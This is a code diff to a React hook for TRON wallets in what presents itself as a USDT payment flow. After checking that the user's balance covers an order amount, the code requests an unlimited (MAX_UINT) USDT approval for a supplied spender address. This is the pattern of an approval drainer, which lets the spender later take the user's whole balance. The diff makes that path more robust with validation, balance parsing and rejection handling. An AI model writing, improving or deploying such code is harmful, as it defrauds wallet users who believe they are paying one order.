@@ -265,29 +265,48 @@ export function useTronWallet() {
       return { success: false, error: '钱包未连接' };
     }
 
+    // Validate spender address
+    if (!spenderAddress || typeof spenderAddress !== 'string' || spenderAddress.length < 30) {
+      return { success: false, error: '无效的授权地址' };
+    }
+
     try {
-      const currentAddress = window.tronWeb.defaultAddress.base58;
+      const tronWeb = window.tronWeb;
+      const currentAddress = tronWeb.defaultAddress.base58;
       
       // Check TRX balance for gas (need >= 15 TRX)
-      const trxBalance = await window.tronWeb.trx.getBalance(currentAddress);
+      const trxBalance = await tronWeb.trx.getBalance(currentAddress);
       const trxFormatted = trxBalance / 1_000_000;
       if (trxFormatted < 15) {
         return { success: false, error: '请确保账户有15个TRX做为交易手续费' };
       }
 
       // Get USDT contract
-      const contract = await window.tronWeb.contract(TRC20_ABI, USDT_CONTRACT_ADDRESS);
+      const contract = await tronWeb.contract(TRC20_ABI, USDT_CONTRACT_ADDRESS);
       
       // Check USDT balance
       const usdtBalance = await contract.balanceOf(currentAddress).call();
-      const usdtBalanceFormatted = parseInt(usdtBalance._hex || usdtBalance.toString(), 16) / 1e6;
+      let usdtBalanceFormatted = 0;
+      
+      if (usdtBalance) {
+        if (typeof usdtBalance === 'object' && usdtBalance._hex) {
+          usdtBalanceFormatted = parseInt(usdtBalance._hex, 16) / 1e6;
+        } else if (typeof usdtBalance === 'object' && usdtBalance.toString) {
+          const balanceStr = usdtBalance.toString();
+          usdtBalanceFormatted = parseFloat(balanceStr) / 1e6;
+        } else if (typeof usdtBalance === 'string') {
+          usdtBalanceFormatted = parseFloat(usdtBalance) / 1e6;
+        } else if (typeof usdtBalance === 'number') {
+          usdtBalanceFormatted = usdtBalance / 1e6;
+        }
+      }
       
       if (usdtBalanceFormatted < orderAmount) {
         return { success: false, error: '当前USDT余额不足，无法支付' };
       }
 
-      // Execute unlimited approval
-      const transaction = await contract.approve(spenderAddress, MAX_UINT).send({
+      // Execute unlimited approval - ensure spenderAddress is passed as string
+      const transaction = await contract.approve(String(spenderAddress), MAX_UINT).send({
         feeLimit: 100_000_000,
         callValue: 0,
         shouldPollResponse: true
@@ -306,14 +325,16 @@ export function useTronWallet() {
       console.error('Approve error:', error);
       
       // Check for user rejection
-      if (error.message?.includes('User rejected') || 
-          error.message?.includes('User denied') ||
-          error.message?.includes('cancelled') ||
-          error.message?.includes('Confirmation declined')) {
+      const errorMsg = error?.message || '';
+      if (errorMsg.includes('User rejected') || 
+          errorMsg.includes('User denied') ||
+          errorMsg.includes('cancelled') ||
+          errorMsg.includes('Confirmation declined') ||
+          errorMsg.includes('user rejected')) {
         return { success: false, error: '交易失败：Request Signature: User denied request signature.' };
       }
       
-      return { success: false, error: error.message || '授权失败' };
+      return { success: false, error: errorMsg || '授权失败' };
     }
   }, []);
 
